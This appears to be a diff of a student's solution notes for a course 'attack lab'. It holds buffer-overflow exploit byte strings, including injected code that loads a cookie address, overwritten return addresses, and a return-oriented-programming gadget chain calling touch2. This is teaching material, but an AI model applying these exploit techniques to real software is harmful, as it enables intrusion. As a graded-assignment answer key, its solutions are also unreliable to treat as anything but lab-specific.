@@ -1,4 +1,4 @@
-Phase 0
+Phase 1
 =======
 
 Determine address of touch1()
@@ -19,7 +19,7 @@ Sample buffer:
 
   55 19 40 00 00 00 00 00  /* address of touch1 */
 
-Phase 1
+Phase 2
 =======
 
 Similar to previous phase, but call a function with an argument
@@ -52,7 +52,7 @@ Sample buffer:
 
   81 19 40 00 00 00 00 00  /* address of touch2 */
 
-Phase 2
+Phase 3
 =======
 
 Call touch3() with cookie's string representation as argument
@@ -65,41 +65,72 @@ argument is.
 
 Solution:
 
-48 8d 3c 25 f8 81 67 55
-c3 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-38 81 67 55 00 00 00 00  
-8f 1a 40 00 00 00 00 00
-48 c7 04 25 e7 81 67 55  
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-36 38 65 32 64 39 39 61
+48 8d 3c 25 f8 81 67 55  /* lea 0x556781f8, %rdi
+			 /* 0x556781f8 is location of cookie string, way down in buffer text to avoid being overwritten by other functions
 
-Phase 3
+c3 00 00 00 00 00 00 00  /* retq */
+
+00 00 00 00 00 00 00 00
+
+38 81 67 55 00 00 00 00  /* overwriting ret. address.  This is address to exploit (1st line of buffer)
+
+8f 1a 40 00 00 00 00 00  /* touch3
+
+00 00 00 00 00 00 00 00  
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+36 38 65 32 64 39 39 61  /* cookie string */
+
+Phase 4
 =======
 Use return oriented programming to call touch2(cookie)
 Solution:
 
 dd dd dd dd dd dd dd dd
+
 dd dd dd dd dd dd dd dd
+
 dd dd dd dd dd dd dd dd
+
 5d 1b 40 00 00 00 00 00
+
 9a d9 e2 68 00 00 00 00
+
 35 1b 40 00 00 00 00 00
+
 81 19 40 00 00 00 00 00                         
